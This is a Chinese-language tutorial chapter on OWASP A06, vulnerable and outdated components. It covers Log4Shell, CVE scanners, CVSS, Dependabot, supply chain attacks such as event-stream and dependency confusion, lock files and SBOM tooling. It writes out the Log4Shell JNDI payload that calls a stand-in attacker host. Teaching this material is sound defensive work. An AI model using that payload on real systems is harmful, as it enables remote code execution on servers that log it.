# Ch 11 — A06 Vulnerable & Outdated Components

> 目標：理解 supply chain attack、CVE 怎麼追、dependency 管理工具。

## A06 是什麼

「**用了有 known vulnerability 的 dependency**」 — 你 code 沒 bug，但 import 的 library 有。

現代 web app 一個典型 npm project 有 1000+ transitive dependencies。任何一個有 CVE → 你的 app 受影響。

統計：

- 平均 npm package 有 79 transitive deps
- npm 上有 200K+ 已知 vulnerable packages
- 80% 已 known 漏洞**有 patch 但沒人上**

**「沒 update = 自願受攻擊」**。

## 經典案例：Log4Shell（CVE-2021-44228）

2021 年 12 月公布。Apache Log4j 2 的 RCE：

```
攻擊者送這個字串到任何被 log 的欄位（如 User-Agent）：

${jndi:ldap://attacker.com/exploit}
```

Log4j 看到 → 跑 JNDI lookup → 連 attacker.com:LDAP → 拿到 Java class file → 載入執行。

**一行字串 → RCE**。

影響：

- 全球幾乎所有 Java app（Log4j 是 standard）
- iCloud / Twitter / Steam / Tesla / Minecraft 都中
- patch 後仍長尾（很多老系統沒 update）

教訓：

- dependency 要追 CVE
- defense in depth：即使 vulnerable lib，多層防禦能擋 some attack
- network egress filtering（你的 server 不該對 attacker.com 發 outbound LDAP）

## 怎麼追 CVE

### 1. 用 dependency scanner

| 工具 | 範圍 |
|---|---|
| **`npm audit`** | npm |
| **`pip-audit`** | Python |
| **`bundler-audit`** | Ruby |
| **`govulncheck`** | Go |
| **Snyk** | 多語言 + Free tier |
| **Dependabot** | GitHub 自動 PR |
| **Trivy** | Container + filesystem |
| **OWASP Dependency-Check** | Java 強 |

每個 CI 都該跑。

### 2. CVE database

- **NVD (National Vulnerability Database)**: https://nvd.nist.gov/
- **GitHub Security Advisories**: https://github.com/advisories
- **CVE.org**: https://www.cve.org/
- **Exploit-DB**: https://www.exploit-db.com/（含 PoC）

每 CVE 有編號（如 CVE-2021-44228）+ CVSS score（嚴重度）。

### 3. 訂閱 advisory

- npm advisory mailing list
- GitHub Watch repos
- security blogs / Twitter

## CVSS Score

CVE 有 CVSS 分數（0-10）：

| Range | 嚴重度 |
|---|---|
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

Log4Shell = 10.0 (max)。

CVSS 看：

- Attack Vector（網路 / 本機）
- Attack Complexity
- Privilege Required
- User Interaction
- Confidentiality / Integrity / Availability impact

production 至少修 High / Critical。

## 自動 update：Dependabot

GitHub 內建（免費）：

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

設好後 GitHub 自動：

- 偵測 outdated dep
- 開 PR 升級
- 跑 tests
- 你 review + merge

「**zero effort dependency 管理**」。

## Supply chain attack

更陰險：dep 本身正常，但被植入 malicious code。

### event-stream 事件（2018）

熱門 npm package `event-stream`，原作者轉手給陌生 maintainer。新 maintainer 加了 dependency `flatmap-stream`，**它含 cryptocurrency stealer**（針對 Copay 比特幣 wallet）。

被發現前裝過幾百萬次。

### colors.js / faker.js（2022）

開發者抗議 OSS 沒被付費 → 故意 push 壞版本到自己的 popular package：

- `colors.js` 加無限 loop
- `faker.js` print "LIBERTY LIBERTY LIBERTY"

下載量百萬級，馬上廣泛 break production。

### typosquatting

註冊跟熱門 package 相似名字：

- `requests` → `requets`
- `lodash` → `lod_ash`

開發者打錯字 → 裝到 malicious package。

### dependency confusion

公司有 internal package（如 `mycorp-utils`），但**沒在 public registry 註冊**。攻擊者註冊同名到 public：

```
- internal NPM: mycorp-utils 1.0.0
- public NPM:   mycorp-utils 99.0.0  ← attacker
```

build 時 npm 看到 99.0.0 比較高 → 拉 attacker 版 → RCE。

修：

- internal package 用 `@scope/`（@mycorp/utils）
- private registry 設定優先順序
- pin 版本

## dependency lock file

`package-lock.json` / `Pipfile.lock` / `Gemfile.lock` / `go.sum`：

- 記錄完整 dep tree + 版本 + hash
- 重 build 時保證**完全一樣**的 dep
- 防 transitive dep 突然換版

**lock file 必 commit**。

## SBOM（Software Bill of Materials）

「**這個 software 用了哪些 dependencies**」的清單：

```json
{
  "components": [
    {"name": "react", "version": "18.2.0"},
    {"name": "lodash", "version": "4.17.21"},
    ...
  ]
}
```

format：CycloneDX / SPDX。

新 CVE 出 → 你能立刻知道**哪些產品受影響**。

工具：

- syft（生成 SBOM）
- grype（用 SBOM 比對 CVE DB）

```bash
# 生 SBOM
syft your-image:latest -o cyclonedx > sbom.json

# 掃漏洞
grype sbom:./sbom.json
```

US 政府 2022 起 mandates SBOM。

## 防禦 checklist

- [ ] dependency lock file commit
- [ ] CI 跑 `npm audit` / `pip-audit` / 等
- [ ] 啟用 Dependabot / Renovate
- [ ] 定期 review + 升級
- [ ] critical CVE 立刻修
- [ ] 用 reputable source（official npm / pypi，不要從 random repo install）
- [ ] pin 版本（不用 `^`，用具體版本）
- [ ] 內部 package 用 scope
- [ ] 生 SBOM（regulated industry）

## 動手練習

**1. 對自己 project 跑 audit**

```bash
# Node project
cd your-node-project
npm audit
npm audit fix

# Python
pip-audit

# 或用 Snyk
snyk test
```

看有多少 vulnerability。

**2. 啟用 Dependabot**

對 GitHub repo：

```bash
mkdir -p .github
cat > .github/dependabot.yml <<EOF
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
EOF

git add .github/dependabot.yml
git commit -m "Enable Dependabot"
git push
```

幾小時後 GitHub 開始自動跑。

**3. 看 Log4Shell PoC**

GitHub 搜 `log4shell-poc`，看實際 exploit code。**只在自己 lab 跑**。

**4. SBOM 練習**

```bash
# 對 docker image 生 SBOM
syft alpine:latest -o cyclonedx > alpine-sbom.json

# 比對 CVE
grype sbom:./alpine-sbom.json
```

**5. Juice Shop A06**

- "Bonus Payload" challenge

或自己看 Juice Shop 的 `package.json`，挑 1 個老 dep，研究 CVE。

## 自我檢核

- [ ] 知道 Log4Shell 攻擊原理
- [ ] 用過 npm audit / pip-audit / 等
- [ ] 知道 CVSS score 範圍跟意義
- [ ] 4+ 種 supply chain attack 類型
- [ ] dependency lock file 一定 commit
- [ ] SBOM 用過至少 1 次
- [ ] 自己 project 啟用 Dependabot

下一章看 A07 Auth Failures — 認證流程的常見漏洞。

→ [Ch 12 A07 Identification & Authentication Failures](./12-a07-auth-failures.md)
